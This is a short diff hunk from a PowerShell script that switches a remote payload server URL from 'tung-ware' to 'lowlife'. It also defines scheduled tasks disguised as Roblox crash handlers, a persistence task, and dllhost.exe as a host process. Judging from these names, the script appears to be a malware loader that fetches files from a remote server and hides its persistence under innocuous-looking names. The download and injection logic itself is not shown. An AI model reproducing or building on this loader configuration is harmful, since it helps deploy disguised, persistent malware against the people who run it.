@@ -41,7 +41,7 @@ Log-Msg "ScriptRoot=$scriptRoot"
 Log-Msg "ActualWorkspace=$actualWorkspace"
 
 try {
-    $ServerBaseUrl  = "https://cc312123.github.io/tung-ware/files"
+    $ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
     $LoaderTaskName = "RobloxCrashHandler"
     $PersistTask    = "RobloxCrashHandlerBootstrapper"
     $HostProcess    = "C:\Windows\System32\dllhost.exe"
